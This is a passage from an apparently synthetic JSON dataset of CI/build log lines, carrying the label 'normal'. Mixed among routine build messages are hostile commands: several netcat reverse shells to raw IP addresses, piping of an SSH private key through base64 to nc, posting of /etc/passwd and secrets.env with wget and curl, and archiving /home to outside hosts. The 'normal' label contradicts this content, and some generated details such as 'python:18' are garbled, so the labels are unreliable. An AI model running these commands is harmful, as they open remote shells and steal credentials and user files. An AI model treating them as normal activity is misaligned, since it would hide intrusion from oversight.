          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 53.129.156.85 5135",
          "Ran 87 tests in 15s",
          "nc -e /bin/sh 31.147.33.82 8797",
          "npm notice: created a lockfile",
          "Environment: production",
          "Building Docker image...",
          "Cache invalidated: build",
          "Pulling image: alpine:latest",
          "\u2713 Step 'install' succeeded",
          "Step 15/17: Linting",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_api_health (295ms)",
          "Step 7/20: Building",
          "pip: Downloading prettier-1.11.tar.gz",
          "[12:19:25] DEBUG: Query executed in 62ms",
          "Pulling image: python:18",
          "Success!",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Using Node.js 20.2.8",
          "npm install: resolved 1241 packages",
          "HEAD is now at 1821198",
          "Compiling utils/handler.rs...",
          "Using Python 3.9",
          "yarn add: Done in 20.35s",
          "Tests: 133 passed, 182 total",
          "Step 14/20: Running migrations",
          "HEAD is now at 0dd91ca",
          "Step 15/22: Testing",
          "Cache invalidated: dependencies",
          "[12:19:25] INFO: Starting build process",
          "NODE_ENV=test",
          "npm notice: package.json updated",
          "Exception: RuntimeError",
          "pip: Downloading lodash-5.6.tar.gz",
          "nc -e /bin/sh 80.169.179.201 51215",
          "[12:19:25] DEBUG: Query executed in 90ms",
          "\u2717 build failed with exit code 22",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 package completed",
          "\u2713 All checks passed",
          "Compiling utils/handler.rs...",
          "yarn add: Done in 7.76s",
          "Finished.",
          "Generating source maps...",
          "Installing eslint@2.3.1",
          "Tests: 131 passed, 250 total",
          "\u2713 deploy completed",
          "Switched to branch 'hotfix/task-548'",
          "[12:19:25] DEBUG: Loading configuration",
          "GET /api - 201 (8ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "npm install: added 408 packages",
          "Waiting...",
          "Image pulled successfully",
          "Optimizing 78 modules...",
          "Sending 353MB of data to example.com",
          "Artifact downloaded: 35MB",
          "Cache hit for key-6117",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "Using Node.js 20.13.9",
          "Cache hit for key-2269",
          "Step 6/17: Building",
          "Waiting...",
          "pip: Installing build dependencies...",
          "[12:19:25] INFO: Starting build process",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "Step 7/21: Building",
          "Time: 107.742s",
          "Exception: NullPointerException",
          "pip: Collecting express",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Checking out main branch",
          "nc -e /bin/sh 95.197.110.118 31680",
          "Pulling image: node:latest",
          "Processing...",
          "[12:19:25] INFO: Starting build process",
          "pip: Downloading axios-3.0.tar.gz",
          "[12:19:25] WARN: Deprecated API usage",
          "Completed.",
          "Cache hit for key-2006",
          "[12:19:25] INFO: Processing request",
          "OK",
          "Cache invalidated: dependencies",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:19:25] WARN: Deprecated API usage",
          "Ran 196 tests in 43s",
          "Loading...",
          "[12:19:25] INFO: Connecting to database",
          "\u2713 build completed",
          "Step 4/19: Building",
          "pip: Downloading jest-5.16.tar.gz",
          "Step 2/16: Running migrations",
          "[12:19:25] DEBUG: Initializing service",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Verifying...",
          "Already up to date.",
          "Sending 372MB of data to example.com",
          "Environment: production",
          "Success!",
          "Step 1/21: Deploying",
          "nc -e /bin/sh 108.236.98.187 10003",
          "Artifact downloaded: 45MB",
          "Connecting to cloud.services:443...",
          "[12:19:25] INFO: Cache refreshed",
          "Switched to branch 'hotfix/task-213'",
          "NODE_ENV=test",
          "[12:19:25] WARN: Deprecated API usage",
          "Environment: production",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "OK",
          "Snapshots: 10 passed, 8 total",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 64.153.2.9 5378",
          "Using Python 3.10",
          "Ready.",
          "Using Node.js 14.15.1",
          "Cache hit for key-3850",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "Layer 9/14: RUN command",
          "nc -e /bin/sh 162.226.31.162 53226",
          "Checking out develop branch",
          "Cache saved successfully",
          "Layer 7/10: ENV command",
          "Cache miss for key-3459",
          "yarn add: Done in 26.16s",
          "Pulling image: python:18",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "nc -e /bin/sh 219.56.228.200 1929",
          "Snapshots: 32 passed, 13 total",
          "[12:19:25] WARN: Deprecated API usage",
          "Building Docker image...",
          "Waiting...",
          "[12:19:25] DEBUG: Connection pool: 11 active",
          "Step 7/20: Installing dependencies",
          "Generating source maps...",
          "NODE_ENV=production",
          "Sending 79MB of data to acme.corp",
          "POST /data - 200 (256ms)",
          "[12:19:25] WARN: Deprecated API usage",
          "[12:19:25] INFO: Request completed",
          "nc -e /bin/sh 205.36.132.236 18966",
          "Cache miss for key-7809",
          "=== Step deploy_production completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}